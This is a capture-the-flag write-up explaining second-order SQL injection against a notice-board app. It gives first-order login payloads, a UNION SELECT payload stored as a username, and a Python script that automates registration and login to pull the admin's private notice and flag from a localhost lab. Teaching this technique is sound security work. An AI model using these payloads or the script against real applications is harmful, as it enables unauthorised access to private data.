## Title: Exploiting Trust — A Second-Order SQLi Walkthrough
**Author:** CTF Core Team

### 🔍 Phase 1: Reconnaissance & The Wall
Upon visiting the application, we see a sleek Login/Registration page for a College Notice Board. 
Our first instinct as a hacker is to test for standard First-Order SQL Injection. We try entering payloads like `' OR 1=1 -- ` or `admin'#` into the username and password fields during login.

**Result:** Nothing happens. We either get an "Invalid credentials" error or the system simply registers a new user with the literal name `' OR 1=1 -- `. 
This means the developer has properly implemented **Prepared Statements** on the authentication and registration endpoints. Direct injection is impossible here.

### 🕵️ Phase 2: Finding the Missing Link (Second-Order)
Let's register a normal user (e.g., `student1`) and log in.
We are redirected to `dashboard.php`. The dashboard displays:
1. A welcome message: `Welcome, student1!`
2. A list of our published notices.

**How does the backend fetch these notices?**
The backend likely queries the `users` table to get our username, and then uses that username to query the `notices` table. 
*What if the developer forgot to use Prepared Statements on the second query because they assumed data coming from the database is already safe?*

This is called **Second-Order SQL Injection**. 
The payload is safely stored in the database first, but gets executed maliciously when retrieved and used in a new query.

### ⚔️ Phase 3: Crafting the Payload
We want to extract notices where the author is `admin` and the notice is private (`is_private = 1`).
Assume the vulnerable backend query looks like this:
```sql
SELECT title, content FROM notices WHERE author = '$username' AND is_private = 0
If we register an account where our username itself is an SQL payload, we can manipulate this query. Let's use a UNION SELECT payload:
Payload: x' UNION SELECT title, content FROM notices WHERE author='admin' AND is_private=1 -- -
When the dashboard executes the query, it becomes:
code
SQL
SELECT title, content FROM notices WHERE author = 'x' UNION SELECT title, content FROM notices WHERE author='admin' AND is_private=1 -- -' AND is_private = 0
The ' closes the author string.
UNION SELECT appends the results of our malicious query (fetching the admin's private flag).
-- - comments out the rest of the original query (' AND is_private = 0), preventing syntax errors.
🐍 Phase 4: Execution
Instead of doing it manually, here is a Python script to automate the exploit:
code
Python
import requests
import random
import string

url = "http://localhost:8000"
session = requests.Session()

# 1. Generate a random prefix to ensure a unique username on every run
rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))

# 2. The Second-Order SQLi Payload
malicious_username = f"{rand_str}' UNION SELECT title, content FROM notices WHERE author='admin' AND is_private=1 -- -"
password = "hacked123"

print("[*] Step 1: Registering user with SQLi payload...")
reg_data = {'action': 'register', 'username': malicious_username, 'password': password}
session.post(f"{url}/index.php", data=reg_data)

print("[*] Step 2: Logging in to trigger the payload...")
login_data = {'action': 'login', 'username': malicious_username, 'password': password}
session.post(f"{url}/index.php", data=login_data)

print("[*] Step 3: Checking Dashboard for Flag...")
dashboard_res = session.get(f"{url}/dashboard.php")

if "CTF{" in dashboard_res.text:
    print("\n[🎉] CHALLENGE SOLVED! FLAG FOUND:")
    for line in dashboard_res.text.split('\n'):
        if "CTF{" in line:
            # Cleaning up HTML tags for clean output
            print("    " + line.strip().replace('<p>', '').replace('</p>', ''))
else:
    print("\n[-] Exploit failed.")
🏁 Conclusion
When we log in, the dashboard triggers the malicious username, forces the database to fetch the Admin's hidden row, and displays it right in our UI!
Flag: CTF{2nd_0rd3r_SQL1_M4st3r}
